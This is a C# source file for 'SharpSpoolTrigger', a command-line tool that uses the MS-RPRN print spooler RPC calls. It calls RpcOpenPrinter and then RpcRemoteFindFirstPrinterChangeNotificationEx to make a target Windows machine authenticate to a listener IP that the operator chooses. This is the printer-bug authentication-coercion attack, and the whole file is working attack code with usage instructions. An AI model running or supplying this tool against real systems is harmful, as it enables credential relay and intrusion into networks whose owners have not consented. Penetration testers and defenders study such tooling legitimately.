using System;
using static SharpSpoolTrigger.NativeMethods;

namespace SharpSpoolTrigger
{
    internal class Program
    {

        private static void Main(string[] args)
        {
            if (args.Length < 2)
            {
                Console.WriteLine("Usage: SharpSpoolTrigger.exe <Target IP> <Listener IP>");
                Console.WriteLine("Example: SharpSpoolTrigger.exe 192.168.1.10 192.168.1.250");
                return;
            }

            Console.WriteLine($"[+] Running on {(IntPtr.Size == 8 ? "64-bit" : "32-bit")} architecture.");


            var Rprn = new rprn();
            IntPtr hHandle = IntPtr.Zero;
            var devmodeContainer = new DEVMODE_CONTAINER();

            try
            {
                Console.WriteLine("[*] Attempting to connect to printer on \\\\" + args[0]);
                var ret = Rprn.RpcOpenPrinter("\\\\" + args[0], out hHandle, null, ref devmodeContainer, 0);
                if (ret != 0)
                {
                    Console.WriteLine($"[-] RpcOpenPrinter failed with status: {ret} ({GetErrorDescription(ret)})");
                    return;
                }
                Console.WriteLine("[+] RpcOpenPrinter succeeded.");

                Console.WriteLine("[*] Setting up remote printer change notification...");
                ret = Rprn.RpcRemoteFindFirstPrinterChangeNotificationEx(hHandle, 0x00000100, 0, "\\\\" + args[1], 0);
                if (ret != 0)
                {
                    Console.WriteLine($"[-] RpcRemoteFindFirstPrinterChangeNotificationEx failed with status: {ret} ({GetErrorDescription(ret)})");
                    return;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Exception occurred: {ex.Message}");
            }
            finally
            {
                if (hHandle != IntPtr.Zero)
                {
                    Rprn.RpcClosePrinter(ref hHandle);
                    Console.WriteLine("[+] Printer handle closed successfully.");
                }
            }
        }


        private static string GetErrorDescription(int errorCode)
        {
            switch (errorCode)
            {
                case 6:
                    return "Invalid handle (ERROR_INVALID_HANDLE)";
                case 5:
                    return "Access denied (ERROR_ACCESS_DENIED)";
                case 1722:
                    return "The RPC server is unavailable (RPC_S_SERVER_UNAVAILABLE)";
                default:
                    return "Unknown error";
            }
        }
    }
}